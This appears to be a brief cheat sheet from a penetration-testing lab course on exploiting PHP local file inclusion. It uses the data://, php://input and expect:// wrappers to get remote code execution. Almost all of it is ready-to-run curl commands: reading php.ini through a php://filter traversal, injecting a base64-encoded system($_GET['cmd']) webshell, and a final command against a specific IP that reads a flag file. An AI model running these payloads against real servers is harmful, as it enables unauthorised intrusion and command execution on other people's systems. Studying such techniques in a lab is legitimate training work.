Three most common php wrappers for RCE:
- data
- input
- expect

## Data

**Checking PHP configurations
```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
- Try different version numbers besides 7.4
- Nginx: /etc/php/X.Y/fpm/php.ini
- Since allow_url_include is enabled, we can use the Data wrapper!

** Remote Code Execution

Since allow_url_include is enabled, we can proceed with our data wrapper attack.
```
echo '<?php system($_GET["cmd"]); ?>' | base64
```
- After base64, then URL encode it
- Use ?cmd= to use commands
```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

## Input
- Vulnerable parameter must accept POST requests for this attack to work
- Also, allow_url_include must be enabled

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
- Add webshell as POST data

## Expect
```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```
- Check if expect wrapper is enabled
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```


```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.61.242:31754/index.php?language=php://input&cmd=cat%20%2F37809e2f8952f06139011994726d9ef1%2Etxt"
```
